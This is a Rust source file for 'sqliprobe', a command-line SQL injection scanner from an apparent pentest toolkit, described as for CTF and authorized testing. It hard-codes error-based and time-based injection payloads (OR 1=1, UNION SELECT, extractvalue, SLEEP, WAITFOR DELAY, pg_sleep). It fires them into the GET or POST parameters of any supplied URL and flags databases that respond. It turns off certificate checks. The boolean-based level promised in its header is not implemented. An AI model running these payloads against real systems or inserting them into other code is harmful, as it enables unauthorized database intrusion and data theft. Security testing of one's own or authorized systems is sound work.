//! sqliprobe — SQL Injection Detection Tool
//! NuRichter · CySec Arsenal
//!
//! Tests for error-based, boolean-based, and time-based SQLi.
//! Designed for CTF challenges and authorized pentest targets.
//!
//! Usage:
//!   sqliprobe -u "http://target.ctf/page?id=1"
//!   sqliprobe -u "http://target.ctf/login" --method POST --data "user=admin&pass=x"
//!   sqliprobe -u "http://target.ctf/page?id=1" --param id --level 3

use std::time::{Duration, Instant};

use anyhow::Result;
use arsenal_core::{
    banner::{print_banner, Module},
    Finding, Severity,
    found, info, ok, warn,
};
use clap::Parser;
use colored::Colorize;

const ERROR_SIGS: &[&str] = &[
    "sql syntax", "mysql_fetch", "ora-", "pg::", "sqlite",
    "syntax error", "unclosed quotation", "unterminated string",
    "microsoft sql", "warning: mysql", "division by zero",
    "quoted string not properly terminated", "odbc driver",
    "sqlite3.operationalerror", "pdo exception", "sqlstate",
];

const PAYLOADS_ERROR: &[&str] = &[
    "'", "''", "\"", "`", "\\",
    "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
    "' AND 1=2--", "1' ORDER BY 1--", "1' ORDER BY 100--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
];

const PAYLOADS_TIME: &[&str] = &[
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' OR SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
];

#[derive(Parser, Debug)]
#[command(name = "sqliprobe", about = "💉 SQLi Probe — CySec Arsenal")]
struct Args {
    /// Target URL
    #[arg(short = 'u', long)]
    url: String,

    /// HTTP method
    #[arg(long, default_value = "GET")]
    method: String,

    /// POST body (url-encoded)
    #[arg(long, default_value = "")]
    data: String,

    /// Specific parameter to test
    #[arg(long, default_value = "")]
    param: String,

    /// Test level: 1=error only, 2=+time, 3=+boolean
    #[arg(long, default_value_t = 1)]
    level: u8,

    /// Request timeout (ms)
    #[arg(long, default_value_t = 8000)]
    timeout: u64,
}

fn parse_qs(qs: &str) -> Vec<(String, String)> {
    qs.split('&')
        .filter_map(|p| p.split_once('='))
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect()
}

fn inject_param(params: &[(String, String)], target: &str, payload: &str) -> String {
    params.iter()
        .map(|(k, v)| {
            let val = if k == target { payload.to_string() } else { v.clone() };
            format!("{}={}", k, urlencoding(val.as_str()))
        })
        .collect::<Vec<_>>()
        .join("&")
}

fn urlencoding(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    print_banner(Module::SqliProbe);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(args.timeout + 6000))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (sqliprobe/1.0 CTF)")
        .build()?;

    // Parse params from URL query string + POST body
    let parsed = url::Url::parse(&args.url)?;
    let url_params: Vec<(String, String)> = parsed
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    let post_params = if !args.data.is_empty() {
        parse_qs(&args.data)
    } else {
        vec![]
    };

    let all_params: Vec<String> = url_params.iter()
        .chain(post_params.iter())
        .filter(|(k, _)| args.param.is_empty() || *k == args.param)
        .map(|(k, _)| k.clone())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    if all_params.is_empty() {
        println!("{}", warn("No GET/POST parameters detected."));
        return Ok(());
    }

    println!("  {}", info(&format!("Parameters: {:?}", all_params)));
    println!("  {}", info(&format!("Level: {}", args.level)));
    println!();

    let mut findings: Vec<Finding> = Vec::new();

    for param in &all_params {
        println!("  {}", info(&format!("Testing param: {}", param.bright_yellow())));

        // Error-based
        for payload in PAYLOADS_ERROR {
            let test_url = if !url_params.is_empty() {
                let new_qs = inject_param(&url_params, param, payload);
                format!("{}?{}", parsed.path(), new_qs)
            } else {
                args.url.clone()
            };

            let full_url = if url_params.iter().any(|(k,_)| k == param) {
                format!("{}?{}", &args.url.split('?').next().unwrap_or(""), inject_param(&url_params, param, payload))
            } else {
                args.url.clone()
            };

            let resp = if args.method.to_uppercase() == "POST" {
                let new_body = inject_param(&post_params, param, payload);
                client.post(&full_url).body(new_body).send().await
            } else {
                client.get(&full_url).send().await
            };

            if let Ok(r) = resp {
                let body = r.text().await.unwrap_or_default().to_lowercase();
                for sig in ERROR_SIGS {
                    if body.contains(sig) {
                        let detail = format!("param={param} payload={payload:?} sig={sig:?}");
                        println!("  {}", found(&format!("[ERROR-BASED] {detail}")));
                        findings.push(Finding::new("SQLi:ErrorBased", &args.url, &detail, Severity::High));
                        break;
                    }
                }
            }
        }

        // Time-based
        if args.level >= 2 {
            for payload in PAYLOADS_TIME {
                let full_url = format!(
                    "{}?{}",
                    args.url.split('?').next().unwrap_or(""),
                    inject_param(&url_params, param, payload)
                );
                let t0 = Instant::now();
                let _ = client.get(&full_url).send().await;
                let elapsed = t0.elapsed().as_secs_f32();
                if elapsed >= 4.5 {
                    let detail = format!("param={param} payload={payload:?} delay={elapsed:.1}s");
                    println!("  {}", found(&format!("[TIME-BASED] {detail}")));
                    findings.push(Finding::new("SQLi:TimeBased", &args.url, &detail, Severity::High));
                }
            }
        }
    }

    arsenal_core::print_findings(&findings);
    Ok(())
}
